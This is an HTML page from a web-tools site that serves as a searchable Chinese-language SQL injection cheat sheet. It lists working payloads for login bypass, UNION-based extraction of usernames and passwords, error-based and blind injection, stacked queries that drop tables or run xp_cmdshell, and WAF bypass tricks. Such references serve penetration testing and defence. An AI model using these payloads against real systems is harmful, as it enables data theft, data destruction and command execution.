<!DOCTYPE html>
<html lang="zh-CN">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>SQL 注入模式参考 - S-Jiffy</title><link rel="stylesheet" href="../../assets/css/global.css">
<style>.cat-title{font-size:var(--font-size-base);font-weight:600;margin:var(--space-2) 0 var(--space-1);}.pat-row{padding:5px 0;border-bottom:1px solid var(--color-border);font-size:var(--font-size-sm);display:flex;gap:8px;align-items:flex-start;}.pat-row:last-child{border:none;}.pat-pattern{font-family:var(--font-mono);background:var(--color-bg-soft);padding:2px 6px;border-radius:3px;font-size:13px;min-width:200px;word-break:break-all;}.pat-desc{color:var(--color-text-secondary);}.pat-risk{font-size:11px;padding:1px 5px;border-radius:3px;font-weight:600;white-space:nowrap;}.risk-high{background:#fce8e6;color:var(--color-error);}.risk-medium{background:#fef7e0;color:#e37400;}.risk-low{background:#e8f0fe;color:#096bde;}.search-box{margin-bottom:var(--space-2);}</style></head><body>
<header class="global-header"><a href="../../index.html" class="logo">S-Jiffy</a><a href="../../index.html" class="back-btn">← 返回</a></header>
<main class="tool-workspace"><h1>SQL 注入模式参考</h1><p class="tool-desc">常见 SQL 注入攻击模式、技术分类和绕过技巧速查</p>
<div class="card"><div class="search-box"><input id="searchInput" class="input js-focus-input" placeholder="搜索模式、描述、分类..."></div><div id="patternsList"></div></div>
<div class="output-box"><span id="outputText"></span><button class="copy-btn" id="copyBtn">复制</button></div>
</main>
<footer class="global-footer"><div class="tool-status" id="statusBar"></div><div>S-Jiffy · 即用即走</div></footer>
<script src="../../assets/js/global.js"></script>
<script>(function(){
var categories=[
{name:'认证绕过',patterns:[
{pattern:"' OR '1'='1",desc:'始终返回 true，绕过登录验证',risk:'high'},{pattern:"' OR 1=1 --",desc:'注释掉后续 SQL，绕过认证',risk:'high'},{pattern:"admin' --",desc:'以 admin 用户身份绕过密码检查',risk:'high'},{pattern:"' OR '1'='1' #",desc:'MySQL 注释风格绕过',risk:'high'},{pattern:"' OR '1'='1'/*",desc:'多行注释绕过',risk:'high'}
]},
{name:'UNION 查询',patterns:[
{pattern:"' UNION SELECT null,username,password FROM users --",desc:'联合查询提取用户表数据',risk:'high'},{pattern:"' UNION SELECT 1,2,3 --",desc:'探测列数',risk:'medium'},{pattern:"' UNION SELECT @@version,2,3 --",desc:'获取数据库版本信息',risk:'medium'}
]},
{name:'报错注入',patterns:[
{pattern:"' AND ExtractValue(1, CONCAT(0x7e, (SELECT @@version))) --",desc:'MySQL ExtractValue 报错注入',risk:'high'},{pattern:"' AND UpdateXML(1, CONCAT(0x7e, (SELECT user())), 1) --",desc:'MySQL UpdateXML 报错注入',risk:'high'},{pattern:"' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",desc:'MySQL 分组报错注入',risk:'high'}
]},
{name:'布尔盲注',patterns:[
{pattern:"' AND SUBSTRING((SELECT database()),1,1)='a' --",desc:'逐字符爆破数据库名',risk:'medium'},{pattern:"' AND IF(1=1,SLEEP(5),0) --",desc:'基于时间的布尔判断',risk:'medium'}
]},
{name:'时间盲注',patterns:[
{pattern:"' OR IF((SELECT LENGTH(database()))>5,SLEEP(3),0) --",desc:'基于 SLEEP 的时间延迟注入',risk:'medium'},{pattern:"'; WAITFOR DELAY '0:0:5' --",desc:'SQL Server WAITFOR 延迟',risk:'medium'},{pattern:"' OR pg_sleep(5) --",desc:'PostgreSQL pg_sleep 延迟',risk:'medium'}
]},
{name:'堆叠查询',patterns:[
{pattern:"'; DROP TABLE users --",desc:'执行多条语句，删除表',risk:'high'},{pattern:"'; INSERT INTO users VALUES ('hacker','pass') --",desc:'堆叠插入恶意用户',risk:'high'},{pattern:"'; EXEC xp_cmdshell('whoami') --",desc:'SQL Server 执行系统命令',risk:'high'}
]},
{name:'绕过技巧',patterns:[
{pattern:"' UNUNIONION SELSELECTECT",desc:'关键字分割绕过简单 WAF 过滤',risk:'medium'},{pattern:"'/*!*/OR/**/1=1",desc:'MySQL 注释块绕过',risk:'medium'},{pattern:"%27%20OR%201%3D1%20--",desc:'URL 编码绕过',risk:'medium'},{pattern:"'||'1'||'",desc:'Oracle 字符串连接绕过',risk:'medium'}
]}
];
var searchInput=document.getElementById('searchInput'),patternsList=document.getElementById('patternsList'),outputText=document.getElementById('outputText'),copyBtn=document.getElementById('copyBtn');
function render(q){
  var html='';var total=0;q=q.toLowerCase();
  for(var c=0;c<categories.length;c++){
    var cat=categories[c];var catHtml='';var catCount=0;
    for(var p=0;p<cat.patterns.length;p++){
      var pat=cat.patterns[p];
      if(q&&pat.pattern.toLowerCase().indexOf(q)===-1&&pat.desc.toLowerCase().indexOf(q)===-1&&cat.name.toLowerCase().indexOf(q)===-1)continue;
      catCount++;total++;
      var riskCls=pat.risk==='high'?'risk-high':pat.risk==='medium'?'risk-medium':'risk-low';
      catHtml+='<div class="pat-row"><span class="pat-pattern">'+htmlEscape(pat.pattern)+'</span><span class="pat-desc">'+htmlEscape(pat.desc)+'</span><span class="pat-risk '+riskCls+'">'+pat.risk+'</span></div>';
    }
    if(catCount>0)html+='<div class="cat-title">'+htmlEscape(cat.name)+'</div>'+catHtml;
  }
  patternsList.innerHTML=html||'<div style="color:var(--color-text-secondary);padding:8px;">无匹配模式</div>';
  outputText.textContent='共 '+total+' 个注入模式';
  setStatus(total+' 个模式');
}
render('');
searchInput.addEventListener('input',function(){render(this.value);});
copyBtn.addEventListener('click',function(){if(outputText.textContent){copyToClipboard(outputText.textContent,this);setStatus('已复制');}});
})();</script>
</body></html>
